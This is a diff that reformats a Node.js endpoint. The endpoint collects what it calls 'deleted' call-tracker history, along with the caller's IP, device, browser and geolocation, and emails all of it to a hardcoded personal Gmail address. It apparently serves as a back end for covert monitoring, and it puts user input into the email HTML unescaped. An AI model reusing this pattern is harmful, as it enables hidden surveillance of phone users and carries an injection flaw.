@@ -1,63 +1,77 @@
-const { Resend } = require('resend'); const fetch = require('node-fetch'); const UAParser = require('ua-parser-js'); const resend = new Resend(process.env.RESEND_API_KEY);
+const { Resend } = require('resend');
+const fetch = require('node-fetch');
+const UAParser = require('ua-parser-js');
 
-module.exports = async (req, res) => { if (req.method !== 'POST') { return res.status(405).json({ message: 'Method Not Allowed' }); }
+const resend = new Resend(process.env.RESEND_API_KEY);
 
-try { const { data = [], ip: clientIp = 'unknown', deviceInfo = 'unknown', hostName = 'Unknown' } = req.body;
+module.exports = async (req, res) => {
+  if (req.method !== 'POST') {
+    return res.status(405).json({ message: 'Method Not Allowed' });
+  }
 
-// Try getting actual IP from headers (Cloudflare / Vercel)
-const serverIp =
-  req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
-  clientIp;
+  try {
+    const {
+      data = [],
+      ip: clientIp = 'unknown',
+      deviceInfo = 'unknown',
+      hostName = 'Unknown',
+    } = req.body;
 
-// Parse device info
-const parser = new UAParser(deviceInfo);
-const parsed = parser.getResult();
+    const serverIp =
+      req.headers['x-forwarded-for']?.split(',')[0]?.trim() || clientIp;
 
-const os = parsed.os?.name + ' ' + parsed.os?.version;
-const browser = parsed.browser?.name + ' ' + parsed.browser?.version;
-const device = parsed.device?.model || 'Unknown';
+    const parser = new UAParser(deviceInfo);
+    const parsed = parser.getResult();
 
-// Fetch geolocation info
-let geo = {};
-try {
-  const geoRes = await fetch(`https://ipapi.co/${serverIp}/json/`);
-  geo = await geoRes.json();
-} catch {
-  geo = { city: 'N/A', region: 'N/A', country_name: 'N/A', timezone: 'N/A' };
-}
+    const os = `${parsed.os?.name || 'Unknown'} ${parsed.os?.version || ''}`.trim();
+    const browser = `${parsed.browser?.name || 'Unknown'} ${parsed.browser?.version || ''}`.trim();
+    const device = parsed.device?.model || 'Unknown';
 
-const html = `
-  <h2>Call Tracker History Deleted</h2>
-  <p><strong>Host Name:</strong> ${hostName}</p>
-  <p><strong>IP (Client):</strong> ${clientIp}</p>
-  <p><strong>IP (Detected):</strong> ${serverIp}</p>
-  <p><strong>Device Model:</strong> ${device}</p>
-  <p><strong>Operating System:</strong> ${os}</p>
-  <p><strong>Browser:</strong> ${browser}</p>
-  <p><strong>Raw User Agent:</strong> ${deviceInfo}</p>
-  <p><strong>Location:</strong> ${geo.city}, ${geo.region}, ${geo.country_name}</p>
-  <p><strong>Timezone:</strong> ${geo.timezone}</p>
-  <hr>
-  <pre style="font-size: 14px; background: #f4f4f4; padding: 10px; border-radius: 8px;">
+    let geo = {
+      city: 'N/A',
+      region: 'N/A',
+      country_name: 'N/A',
+      timezone: 'N/A'
+    };
 
-${JSON.stringify(data, null, 2)} </pre> `;
+    try {
+      const geoRes = await fetch(`https://ipapi.co/${serverIp}/json/`);
+      geo = await geoRes.json();
+    } catch (err) {
+      console.warn('Geolocation fetch failed:', err);
+    }
 
-await resend.emails.send({
-  from: 'onboarding@resend.dev',
-  to: 'livuapp900@gmail.com',
-  subject: 'Deleted History Report',
-  html
-});
+    const html = `
+      <h2>Call Tracker History Deleted</h2>
+      <p><strong>Host Name:</strong> ${hostName}</p>
+      <p><strong>IP (Client):</strong> ${clientIp}</p>
+      <p><strong>IP (Detected):</strong> ${serverIp}</p>
+      <p><strong>Device Model:</strong> ${device}</p>
+      <p><strong>Operating System:</strong> ${os}</p>
+      <p><strong>Browser:</strong> ${browser}</p>
+      <p><strong>Raw User Agent:</strong> ${deviceInfo}</p>
+      <p><strong>Location:</strong> ${geo.city}, ${geo.region}, ${geo.country_name}</p>
+      <p><strong>Timezone:</strong> ${geo.timezone}</p>
+      <hr>
+      <pre style="font-size: 14px; background: #f4f4f4; padding: 10px; border-radius: 8px;">
+${JSON.stringify(data, null, 2)}
+      </pre>
+    `;
 
-return res.status(200).json({ message: 'History deleted and emailed successfully!' });
+    await resend.emails.send({
+      from: 'onboarding@resend.dev',
+      to: 'livuapp900@gmail.com',
+      subject: 'Deleted History Report',
+      html,
+    });
 
-} catch (error) { console.error('DELETE API ERROR:', error);
+    return res.status(200).json({ message: 'History deleted and emailed successfully!' });
 
-// Always return JSON, even if error is unexpected
-return res.status(500).json({
-  message: 'Server error occurred',
-  error: error.message || 'Unknown error'
-});
-
-} };
-
+  } catch (error) {
+    console.error('DELETE API ERROR:', error);
+    return res.status(500).json({
+      message: 'Server error occurred',
+      error: error.message || 'Unknown error',
+    });
+  }
+};
